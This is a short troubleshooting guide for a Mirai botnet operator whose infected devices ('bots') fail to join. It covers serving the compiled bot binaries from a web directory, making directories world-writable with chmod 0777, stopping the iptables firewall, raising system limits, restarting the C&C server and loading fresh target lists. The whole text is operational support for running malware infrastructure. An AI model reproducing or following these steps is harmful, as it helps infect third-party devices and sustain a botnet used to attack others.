If bots dont join after you have done all the setup in the correct way and bots dont join when you try to load some bots with the ./loader try:


First of all, move all arch in /release folder that you have in /root after you have compiled with build.sh in var/html/www/bins

mv arch files in /release in var/html/www/bins (if bins dir dont exist, make it)
and try to chmod.

chmod 0777 var/
chmod 0777 var/html
chmod 0777 var/html/www
chmod 0777 var/html/www/bins
chmod 0777 var/html/www/bins/*


service iptables stop 
service httpd restart  
service mysqld/mariadb restart

nano /usr/include/bits/typesizes.h
scroll down and edit the 1024 to 999999

ulimit -n999999; ulimit -u999999; ulimit -e999999

THEN RESTART THE BOTNET:

screen ./cnc


AND TRY TO LOAD SOME BOTS (USE FRESH LIST) IF YOU ARE SURE THAT BOTS DONT JOIN FOR THIS ERROR AND NOT BECAUSE YOU USE DEAD LISTS...

If this still dont dont work, make you sure you dont have edited some port in the source of mirai or have wronged some steps of mirai installation like mysql or other.
